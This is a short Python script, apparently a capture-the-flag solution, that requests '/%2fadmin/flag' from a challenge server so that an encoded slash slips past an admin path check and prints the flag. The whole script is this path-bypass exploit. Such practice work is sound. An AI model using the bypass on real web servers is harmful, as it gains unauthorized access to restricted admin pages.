import requests

url = "http://chall.ehax.in:9098"

res = requests.get(f'{url}/%2fadmin/flag')
print("Flag:", res.text.strip())